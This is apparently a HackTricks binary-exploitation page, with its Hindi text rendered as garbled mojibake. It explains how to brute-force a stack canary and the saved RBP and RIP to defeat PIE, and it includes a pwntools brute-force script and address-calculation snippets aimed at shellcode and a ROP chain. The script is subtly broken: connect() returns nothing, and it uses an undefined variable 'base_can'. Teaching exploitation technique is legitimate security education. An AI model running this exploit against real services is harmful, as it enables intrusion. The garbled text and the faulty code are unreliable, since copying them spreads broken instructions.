# рд╕реНрдЯреИрдХ рдореЗрдВ рдмреАрдПрдл рдкрддреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> рд╕реЗ <strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong>!</summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рд╕реЗ рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

**рдЕрдЧрд░ рдЖрдкрдХреЗ рд╕рд╛рдордиреЗ рдПрдХ рдХреИрдирд░реА рдФрд░ PIE (рдкреЛрдЬреАрд╢рди рдЗрдВрдбрд┐рдкреЗрдВрдбреЗрдВрдЯ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓) рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдмрд╛рдЗрдирд░реА рд╣реИ, рддреЛ рдЖрдкрдХреЛ рд╢рд╛рдпрдж рдЙрдиреНрд╣реЗрдВ рджреВрд░ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдвреВрдВрдврдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред**

![](<../../../.gitbook/assets/image (862).png>)

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`checksec`** рдпрд╣ рдирд╣реАрдВ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рдХрд┐ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ рдХреИрдирд░реА рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЕрдЧрд░ рдпрд╣ рд╕реНрдерд╛рдИ рд░реВрдк рд╕реЗ рдХреЙрдореНрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкрд╣рдЪрд╛рдирдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдЗрд╕реЗ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдзреНрдпрд╛рди рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдЧрд░ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕реА рдорд╛рдирдХ рдХреЛрд▓ рдХреЗ рд╢реБрд░реВ рдореЗрдВ рд╕реНрдЯреИрдХ рдореЗрдВ рдПрдХ рдорд╛рди рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕ рдорд╛рди рдХреА рдЬрд╛рдВрдЪ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдХреА рдЬрд╛рддреА рд╣реИред
{% endhint %}

## рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдкрддреЛрдВ

**PIE рдХреЛ рджреВрд░ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдХреБрдЫ рдкрддреЛрдВ рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдФрд░ рдЕрдЧрд░ рдмрд╛рдЗрдирд░реА рдХреЛ рдХреЛрдИ рдкрддрд╛ рдирд╣реАрдВ рд▓реАрдХ рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЖрдк **рд╡рд▓рдирд░реЗрдмрд▓ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рд╕реНрдЯреИрдХ рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЧрдП RBP рдФрд░ RIP рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░реЗрдВ**ред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ рдПрдХ **рдХреИрдирд░реА** рдФрд░ **PIE** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдХреИрдирд░реА рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдлрд┐рд░ **рдЕрдЧрд▓реЗ** 8 рдмрд╛рдЗрдЯ (x64) рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЧрдП **RBP** рд╣реЛрдЧрд╛ рдФрд░ **рдЕрдЧрд▓реЗ** 8 рдмрд╛рдЗрдЯ рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЧрдП **RIP** рд╣реЛрдВрдЧреЗред

{% hint style="success" %}
рд╕рдордЭрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рд╕реНрдЯреИрдХ рдореЗрдВ рд╡рд╛рдкрд╕реА рдкрддрд╛ рдореБрдЦреНрдп рдмрд╛рдЗрдирд░реА рдХреЛрдб рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ, рдЬреЛ, рдпрджрд┐ рджреБрд░реБрдкрдпреЛрдЧ рдмрд╛рдЗрдирд░реА рдХреЛрдб рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ, рддреЛ рдЖрдо рддреМрд░ рдкрд░ рдорд╛рдорд▓рд╛ рд╣реЛрдЧрд╛ред
{% endhint %}

рдмрд╛рдЗрдирд░реА рд╕реЗ RBP рдФрд░ RIP рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдпрд╣ рддрдп рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдорд╛рдиреНрдп рдЕрдиреБрдорд╛рдирд┐рдд рдмрд╛рдЗрдЯ рд╕рд╣реА рд╣реИ рдЕрдЧрд░ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреБрдЫ рдЖрдЙрдЯрдкреБрдЯ рдХрд░рддрд╛ рд╣реИ рдпрд╛ рдпрд╣ рдХреЗрд╡рд▓ рдХреНрд░реИрд╢ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдХреИрдирд░реА рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рд╡рд╣реА рдлрд╝рдВрдХреНрд╢рди RBP рдФрд░ RIP рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
рдЖрдкрдХреЛ PIE рдХреЛ рдкрд░рд╛рд╕реНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдЦрд┐рд░реА рдЪреАрдЬрд╝ рдпрд╣ рд╣реИ рдХрд┐ **рд▓реАрдХ рд╣реБрдП рдкрддреЛрдВ рд╕реЗ рдЙрдкрдпреЛрдЧреА рдкрддреЛрдВ рдХреА рдЧрдгрдирд╛ рдХрд░рдиреА рд╣реИ**: **RBP** рдФрд░ **RIP**ред

**RBP** рд╕реЗ рдЖрдк **рд╕реНрдЯреИрдХ рдореЗрдВ рдЕрдкрдиреА рд╢реИрд▓ рдХреЛ рдХрд╣рд╛рдБ рд▓рд┐рдЦ рд░рд╣реЗ рд╣реИрдВ** рдпрд╣ рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдЬрд╛рдирдирд╛ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдк рд╕реНрдЯреИрдХ рдХреЗ рдЕрдВрджрд░ _"/bin/sh\x00"_ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдХрд╣рд╛рдБ рд▓рд┐рдЦрдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред рд▓реАрдХ рд╣реБрдП RBP рдФрд░ рдЖрдкрдХреА рд╢реИрд▓рдХреЛрдб рдХреЗ рдмреАрдЪ рдХреА рджреВрд░реА рдХреА рдЧрдгрдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдмрд╕ рдПрдХ **рдмреНрд░реЗрдХрдкреЙрдЗрдВрдЯ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм RBP рд▓реАрдХ рд╣реЛ рдЬрд╛рдП** рдФрд░ рдЪреЗрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдХрд┐ рдЖрдкрдХреА рд╢реИрд▓рдХреЛрдб рдХрд╣рд╛рдБ рд╕реНрдерд┐рдд рд╣реИ**, рдлрд┐рд░, рдЖрдк рд╢реИрд▓рдХреЛрдб рдФрд░ RBP рдХреЗ рдмреАрдЪ рдХреА рджреВрд░реА рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
INI_SHELLCODE = RBP - 1152
```
**RIP** рд╕реЗ рдЖрдк **PIE binary рдХрд╛ base address** рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ **рдПрдХ рдорд╛рдиреНрдп ROP chain рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**ред\
рдмреЗрд╕ рдПрдбреНрд░реЗрд╕ рдХреА рдЧрдгрдирд╛ рдХреЗ рд▓рд┐рдП рдмрд╕ `objdump -d vunbinary` рдХрд░реЗрдВ рдФрд░ рдбрд┐рд╕рдПрдВрдмрд▓ рдирд╡реАрдирддрдо рдкрддреЗ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ:

![](<../../../.gitbook/assets/image (476).png>)

рдЙрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╕рднреА рдХреЛрдб рдХреЛ рдвреВрдВрдврдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ **1 рдмрд╛рдЗрдЯ рдФрд░ рдЖрдзрд╛** рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рдлрд┐рд░, рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдмреЗрд╕ рдПрдбреНрд░реЗрд╕ рд▓реАрдХреНрдб RIP рдкрд░ рд╣реЛрдЧрд╛ рд▓реЗрдХрд┐рди "000" рдкрд░ рд╕рдорд╛рдкреНрдд рд╣реЛрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЕрдЧрд░ рдЖрдкрдиреЗ `0x562002970ecf` рд▓реАрдХ рдХрд┐рдпрд╛ рд╣реИ рддреЛ рдмреЗрд╕ рдПрдбреНрд░реЗрд╕ `0x562002970000` рд╣реЛрдЧрд╛ред
```python
elf.address = RIP - (RIP & 0xfff)
```
## рд╕реБрдзрд╛рд░

[**рдЗрд╕ рдкреЛрд╕реНрдЯ рд╕реЗ рдХреБрдЫ рдЕрд╡рд▓реЛрдХрди рдХреЗ рдЕрдиреБрд╕рд╛рд░**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#extended-brute-force-leaking), рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ RBP рдФрд░ RIP рдорд╛рдиреЛрдВ рдХреЛ рд▓реАрдХ рдХрд░рддреЗ рд╕рдордп, рд╕рд░реНрд╡рд░ рдХреНрд░реИрд╢ рдирд╣реАрдВ рд╣реЛрдЧрд╛ рдЬрдм рдХреБрдЫ рдорд╛рди рдЧрд▓рдд рд╣реЛрдВ рдЬреЛ рд╕рд╣реА рдирд╣реАрдВ рд╣реИрдВ рдФрд░ BF рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рд╣реА рдорд╛рдиреЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рд╣реБрдЖ рдорд╛рдиреЗрдЧрд╛ред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ **рдХреБрдЫ рдкрддреЗ рдЗрд╕реЗ рддреЛрдбрд╝ рдирд╣реАрдВ рдкрд╛рдПрдВрдЧреЗ рднрд▓реЗ рд╣реА рд╡реЗ рдмрд┐рд▓реНрдХреБрд▓ рд╕рд╣реА рди рд╣реЛрдВ**ред

рдЙрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рдмреАрдЪ рдПрдХ рдЫреЛрдЯреА рджреЗрд░реА рдЬреЛрдбрд╝рдирд╛ рдЪрд╛рд╣рд┐рдПред
